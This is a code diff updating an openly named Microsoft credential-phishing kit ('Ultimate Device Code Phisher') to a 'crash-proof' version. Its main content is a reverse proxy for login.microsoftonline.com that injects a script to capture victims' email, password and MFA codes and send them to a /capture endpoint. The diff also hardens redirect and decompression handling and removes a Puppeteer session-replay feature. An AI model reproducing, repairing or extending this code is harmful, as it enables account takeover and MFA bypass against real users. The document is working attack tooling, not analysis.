@@ -1,8 +1,7 @@
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v5.3.2 – Phantom Proxy Final
+// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.0 – Crash‑Proof Proxy
 // ============================================================
-// Full reverse-proxy for Microsoft login pages with automatic
-// email, password, and MFA code capture. No canvas dependency.
+// Removed Puppeteer, hardened proxy, safe decompression.
 // ============================================================
 
 const http = require('http');
@@ -20,7 +19,6 @@ const express = require('express');
 const basicAuth = require('express-basic-auth');
 const AdmZip = require('adm-zip');
 const sqlite3 = require('sqlite3').verbose();
-const puppeteer = require('puppeteer');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 const cheerio = require('cheerio');
 
@@ -624,7 +622,7 @@ app.post('/device/fingerprint', (req, res) => {
     });
 });
 
-// ── SECOND-STAGE PHISHING: FULL REVERSE PROXY WITH AUTO MFA CAPTURE ──
+// ── SECOND-STAGE PHISHING: CRASH‑PROOF REVERSE PROXY ──
 app.all('/login*', async (req, res) => {
     const targetBase = 'https://login.microsoftonline.com';
     let targetPath = req.url.replace(/^\/login/, '');
@@ -649,109 +647,138 @@ app.all('/login*', async (req, res) => {
             url: targetUrl,
             headers: headers,
             data: method === 'POST' || method === 'PUT' ? body : undefined,
-            responseType: 'text',
+            responseType: 'arraybuffer', // Safer for compressed content
             timeout: 15000,
+            maxRedirects: 0, // Handle redirects manually
             ...createAxiosConfig(),
-            transformResponse: [data => data]
         });
 
+        // Handle redirects sent by Microsoft
+        if (resp.status === 301 || resp.status === 302 || resp.status === 307 || resp.status === 308) {
+            const location = resp.headers.location;
+            if (location) {
+                res.setHeader('Location', location);
+                return res.status(resp.status).send();
+            }
+        }
+
         const responseHeaders = { ...resp.headers };
-        let data = resp.data;
+        let data = Buffer.from(resp.data);
+
+        // Safe decompression
         const encoding = resp.headers['content-encoding'];
-        if (encoding === 'gzip' || encoding === 'deflate') {
-            const buffer = Buffer.from(data, 'binary');
-            const decompressed = encoding === 'gzip' ? zlib.gunzipSync(buffer) : zlib.inflateSync(buffer);
-            data = decompressed.toString('utf8');
+        if (encoding) {
+            try {
+                if (encoding.includes('gzip')) {
+                    data = zlib.gunzipSync(data);
+                } else if (encoding.includes('deflate')) {
+                    data = zlib.inflateSync(data);
+                } else if (encoding.includes('br')) {
+                    // Ignore Brotli if not supported, just pass raw
+                }
+            } catch (decompError) {
+                console.warn('Decompression error, serving raw:', decompError.message);
+            }
         }
 
+        let html = data.toString('utf8');
         const contentType = resp.headers['content-type'] || '';
+
         if (contentType.includes('text/html')) {
-            const captureScript = `
-                <script>
-                    (function() {
-                        let capturedEmail = '';
-                        let capturedPassword = '';
-                        let capturedMFA = '';
+            try {
+                const $ = cheerio.load(html);
+                const captureScript = `
+                    <script>
+                        (function() {
+                            let capturedEmail = '';
+                            let capturedPassword = '';
+                            let capturedMFA = '';
 
-                        function sendCredentials() {
-                            if (capturedEmail || capturedPassword || capturedMFA) {
-                                fetch('/capture', {
-                                    method: 'POST',
-                                    headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({
-                                        email: capturedEmail,
-                                        password: capturedPassword,
-                                        mfa: capturedMFA
-                                    })
-                                }).catch(() => {});
-                                capturedEmail = '';
-                                capturedPassword = '';
-                                capturedMFA = '';
+                            function sendCredentials() {
+                                if (capturedEmail || capturedPassword || capturedMFA) {
+                                    fetch('/capture', {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({
+                                            email: capturedEmail,
+                                            password: capturedPassword,
+                                            mfa: capturedMFA
+                                        })
+                                    }).catch(() => {});
+                                    capturedEmail = '';
+                                    capturedPassword = '';
+                                    capturedMFA = '';
+                                }
                             }
-                        }
 
-                        document.addEventListener('submit', function(e) {
-                            const form = e.target;
-                            const emailInput = form.querySelector('input[type="email"], input[name="login"], input[name="loginfmt"]');
-                            const passInput = form.querySelector('input[type="password"], input[name="passwd"]');
-                            const mfaInput = form.querySelector('input[name="otc"], input[name="code"], input[name="verificationCode"], input[placeholder*="code" i]');
-                            
-                            if (emailInput && passInput) {
-                                e.preventDefault();
-                                capturedEmail = emailInput.value || '';
-                                capturedPassword = passInput.value || '';
-                                capturedMFA = mfaInput ? mfaInput.value || '' : '';
+                            document.addEventListener('submit', function(e) {
+                                const form = e.target;
+                                const emailInput = form.querySelector('input[type="email"], input[name="login"], input[name="loginfmt"]');
+                                const passInput = form.querySelector('input[type="password"], input[name="passwd"]');
+                                const mfaInput = form.querySelector('input[name="otc"], input[name="code"], input[name="verificationCode"], input[placeholder*="code" i]');
+                                
+                                if (emailInput && passInput) {
+                                    e.preventDefault();
+                                    capturedEmail = emailInput.value || '';
+                                    capturedPassword = passInput.value || '';
+                                    capturedMFA = mfaInput ? mfaInput.value || '' : '';
+                                    sendCredentials();
+                                    const originalAction = form.action;
+                                    form.action = originalAction;
+                                    form.removeEventListener('submit', arguments.callee);
+                                    form.submit();
+                                } else if (mfaInput) {
+                                    e.preventDefault();
+                                    capturedMFA = mfaInput.value || '';
+                                    sendCredentials();
+                                    const originalAction = form.action;
+                                    form.action = originalAction;
+                                    form.removeEventListener('submit', arguments.callee);
+                                    form.submit();
+                                }
+                            });
+
+                            document.addEventListener('input', function(e) {
+                                const input = e.target;
+                                if (input.name === 'otc' || input.name === 'code' || input.name === 'verificationCode' || (input.placeholder && input.placeholder.toLowerCase().includes('code'))) {
+                                    capturedMFA = input.value;
+                                }
+                                if (input.type === 'email' || input.name === 'loginfmt') {
+                                    capturedEmail = input.value;
+                                }
+                                if (input.type === 'password') {
+                                    capturedPassword = input.value;
+                                }
+                            });
+
+                            window.addEventListener('beforeunload', function() {
                                 sendCredentials();
-                                const originalAction = form.action;
-                                form.action = originalAction;
-                                form.removeEventListener('submit', arguments.callee);
-                                form.submit();
-                            } else if (mfaInput) {
-                                e.preventDefault();
-                                capturedMFA = mfaInput.value || '';
-                                sendCredentials();
-                                const originalAction = form.action;
-                                form.action = originalAction;
-                                form.removeEventListener('submit', arguments.callee);
-                                form.submit();
-                            }
-                        });
-
-                        document.addEventListener('input', function(e) {
-                            const input = e.target;
-                            if (input.name === 'otc' || input.name === 'code' || input.name === 'verificationCode' || (input.placeholder && input.placeholder.toLowerCase().includes('code'))) {
-                                capturedMFA = input.value;
-                            }
-                            if (input.type === 'email' || input.name === 'loginfmt') {
-                                capturedEmail = input.value;
-                            }
-                            if (input.type === 'password') {
-                                capturedPassword = input.value;
-                            }
-                        });
-
-                        window.addEventListener('beforeunload', function() {
-                            sendCredentials();
-                        });
-                    })();
-                </script>
-            `;
-
-            const $ = cheerio.load(data);
-            const head = $('head');
-            head.append(captureScript);
-            data = $.html();
+                            });
+                        })();
+                    </script>
+                `;
+                const head = $('head');
+                head.append(captureScript);
+                html = $.html();
+                data = Buffer.from(html, 'utf8');
+                // Update content-length
+                responseHeaders['content-length'] = data.length;
+            } catch (cheerioError) {
+                console.warn('Cheerio manipulation error, serving original:', cheerioError.message);
+            }
         }
+
+        // Remove content-encoding header since we decompressed it
+        delete responseHeaders['content-encoding'];
 
         res.set(responseHeaders);
-        delete res.headers['content-encoding'];
-        const buffer = Buffer.from(data, 'utf8');
-        res.setHeader('content-length', buffer.length);
         res.status(resp.status);
-        res.send(buffer);
+        res.send(data);
 
     } catch (error) {
         console.error('Proxy error:', error.message);
+        // In case of complete failure, redirect the victim to the real Microsoft login
+        console.log('Redirecting victim to real Microsoft login due to proxy failure.');
         res.redirect('https://login.microsoftonline.com');
     }
 });
@@ -934,20 +961,6 @@ app.get('/api/replay/:sessionId', async (req, res) => {
         window.location.href = 'https://login.microsoftonline.com';
     })();`;
     res.json({ replayScript: script });
-
-    if (req.query.puppeteer === 'true') {
-        try {
-            const browser = await puppeteer.launch({ headless: true, args: ['--no-sandbox'] });
-            const page = await browser.newPage();
-            await page.goto('https://login.microsoftonline.com');
-            await page.evaluate(script);
-            const screenshot = await page.screenshot({ encoding: 'base64' });
-            await browser.close();
-            res.json({ replayScript: script, screenshot: `data:image/png;base64,${screenshot}` });
-        } catch (e) {
-            res.status(500).json({ error: 'Puppeteer failed', details: e.message });
-        }
-    }
 });
 
 // ── WebSocket ──
@@ -986,7 +999,7 @@ server.on('upgrade', (req, socket, head) => {
     if (req.url === '/ws') { wsServer.handleUpgrade(req, socket, head, (ws) => { wsServer.emit('connection', ws, req); }); } else { socket.destroy(); }
 });
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Ultimate Device Phisher v5.3.2 – Phantom Proxy Final running on port ${PORT}`);
+    console.log(`✅ Ultimate Device Phisher v5.4.0 – Crash‑Proof Proxy running on port ${PORT}`);
     console.log(`📱 Device page: http://localhost:${PORT}/device`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
